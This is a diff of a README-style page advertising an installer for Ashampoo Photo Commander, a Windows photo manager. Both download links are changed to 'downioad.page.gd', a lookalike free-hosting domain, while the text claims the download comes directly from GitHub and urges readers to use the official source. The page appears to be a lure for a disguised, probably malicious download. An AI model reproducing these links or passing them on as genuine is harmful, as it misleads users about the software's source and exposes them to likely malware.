@@ -2,7 +2,7 @@
 
 Ashampoo Photo Commander is a comprehensive photo management and editing suite designed for Windows 10 and 11 users. It provides powerful tools to enhance, organize, and share your digital photos with ease, making it ideal for both beginners and professionals. With its user-friendly interface and robust features, you can transform your photo library into a well-organized collection of memories.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -60,6 +60,6 @@ A: Yes, Ashampoo often provides a trial version that lets you explore all featur
 
 Ready to transform your photo management experience? Download the latest version of Ashampoo Photo Commander directly from GitHub to enjoy all the features and improvements.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 Remember to download only from the official source to ensure you receive a secure and up-to-date version of the software. Last Updated: 2026
